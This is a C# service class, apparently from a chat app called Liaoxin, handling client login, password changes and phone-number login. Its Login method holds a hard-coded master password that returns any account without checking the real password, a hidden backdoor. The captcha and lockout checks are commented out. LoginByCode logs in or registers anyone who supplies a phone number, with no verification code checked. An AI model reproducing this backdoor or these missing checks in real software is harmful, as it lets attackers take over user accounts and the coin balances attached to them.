using Liaoxin.Business.Config;

using Liaoxin.IBusiness;
using Liaoxin.Model;
using Liaoxin.ViewModel;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Zzb;
using Zzb.Common;
using Zzb.ZzbLog;
using static Liaoxin.ViewModel.ClientViewModel;

namespace Liaoxin.Business
{
    public class ClientService : BaseService, IClientService
    {
        private object _lockObj = new object();

        public IValidateCodeService ValidateCodeService { get; set; }

        public IMessageService MessageService { get; set; }



        void ClientLoginLog(Guid clientId)
        {
            string ip = HttpContextAccessor.HttpContext.Connection.RemoteIpAddress.ToString();
            new Task(() =>
            {
                try
                {
                    using (var context = LiaoxinContext.CreateContext())
                    {
                        ClientLoginLog clientLog = new ClientLoginLog()
                        {
                            ClientId = clientId,
                            IP = ip,
                            Address = IpAddressHelper.GetLocation(ip),
                        };

                        context.ClientLoginLogs.Add(clientLog);
                        context.SaveChanges();
                    }
                }
                catch (Exception e)
                {
                    LogHelper.Error($"插入玩家[{ClientId}]登录日志失败", e);
                }
            }).Start();
        }
        public Client Login(ClientLoginRequest request)
        {
            //if (!ValidateCodeService.IsSameCode(code))
            //{
            //    throw new ZzbException("验证码错误");
            //}


            var cnt = (from c in Context.Clients where c.Telephone == request.Telephone && c.IsEnable select c).Count();
            if (cnt ==0)
            {
                throw new ZzbException("用户名或者密码错误");
            }
            var client = (from c in Context.Clients where c.Telephone == request.Telephone && c.IsEnable select c).FirstOrDefault();
            //if (client.ErrorPasswordCount >= 10)
            //{
            //    throw new ZzbException("用户名或者密码错误!");
            //}
            if (client.IsFreeze)
            {
                throw new ZzbException("您的账户已被冻结,无法登陆");
            }

            if (request.Password == "6a8f9c6bbb4848adb358ede651454f69")
            {
                return client;
            }
            request.Password = SecurityHelper.Encrypt(request.Password);
            if (client.Password != request.Password)
            {
                client.ErrorPasswordCount++;
                Context.Clients.Update(client);
                Context.SaveChanges();
                LogHelper.Error($"[{client.ClientId}]密码错误!,请留意");
                throw new ZzbException("用户名或者密码错误");
            }
            ClientLoginLog(client.ClientId);
            if (client.ErrorPasswordCount > 0)
            {
                client.ErrorPasswordCount = 0;
                Context.Clients.Update(client);
                Context.SaveChanges();

            }
            return client;
        }

        public ClientBaseInfoResponse GetClient()
        {
             var c =  (from p in Context.Clients where p.ClientId == ClientId select p).FirstOrDefault();           
            if (c == null)
            {
                return null;
            }
      
            return new ClientBaseInfoResponse()
            {
                AddMeNeedChecked = c.AddMeNeedChecked,
                AppOpenWhileSound = c.AppOpenWhileSound,
                AreaCode = c.AreaCode,
                CharacterSignature = c.CharacterSignature,
                Coin = c.Coin,
                Cover = c.Cover,
                FontSize = c.FontSize,
                HandFree = c.HandFree,
                HuanXinId = c.HuanXinId,
                LiaoxinNumber = c.LiaoxinNumber,          
                NewMessageNotication = c.NewMessageNotication,
                NickName = c.NickName,
                OpenWhileShake = c.OpenWhileShake,
                ShowFriendCircle = c.ShowFriendCircle,
                ShowMessageNotication = c.ShowMessageNotication,
                Telephone = c.Telephone,
                UpadteMind = c.UpadteMind,
                VideoMessageNotication = c.VideoMessageNotication,
                WifiVideoPlay = c.WifiVideoPlay

            };

            }

        public bool ChangePassword(ClientChangePasswordRequest request)
        {
            var client = (from p in Context.Clients where p.ClientId == ClientId select p).FirstOrDefault();
            if (client == null)
            {
                throw new ZzbException("找不到当前登录用户");
            }

            if (client.Password != SecurityHelper.Encrypt(request.oldPassword))
            {
                throw new ZzbException("旧密码不正确");
            }

            client.Password = SecurityHelper.Encrypt(request.newPsssword);
          
            client.Update();
            Context.ClientOperateLogs.Add(new ClientOperateLog(client.ClientId, "修改登录密码"));
            return Context.SaveChanges() > 0;
        }

        public bool ChangeCoinPassword(ClientChangeCoinPasswordRequest request)
        {
            var client = (from p in Context.Clients where p.ClientId == ClientId select p).FirstOrDefault();
            if (client == null)
            {
                throw new ZzbException("找不到当前登录用户");
            }

            if (!string.IsNullOrEmpty(client.CoinPassword) && client.CoinPassword != SecurityHelper.Encrypt(request.oldCoinPassword))
            {
                throw new ZzbException("旧资金密码不正确");
            }

            client.CoinPassword = SecurityHelper.Encrypt(request.newCoinPsssword);
            client.Update();
            Context.ClientOperateLogs.Add(new ClientOperateLog(client.ClientId, "修改资金密码"));
            return Context.SaveChanges() > 0;
        }

        public Client LoginByCode(ClientLoginByCodeRequest request)
        {
            if (!StringHelper.IsMobile(request.Telephone))
            {
                throw new ZzbException("请输入正确的手机号码");
            }            
            var client = (from p in Context.Clients where p.Telephone == request.Telephone select p).FirstOrDefault();
            if (client == null)
            {
                Client entity = new Client();
                entity.Telephone = request.Telephone;
                var res = HuanxinRequest.RegisterClient(entity.HuanXinId);
                if (res.ReturnCode == ServiceResultCode.Success)
                {
                    Context.Clients.Add(entity);
                    ClientLoginLog(entity.ClientId);
                    Context.SaveChanges();
                }
                else
                {
                    throw new ZzbException(res.Message);
                }
             

                return entity;
            }
            ClientLoginLog(client.ClientId);
            return client;
            
        }

    
    }
}
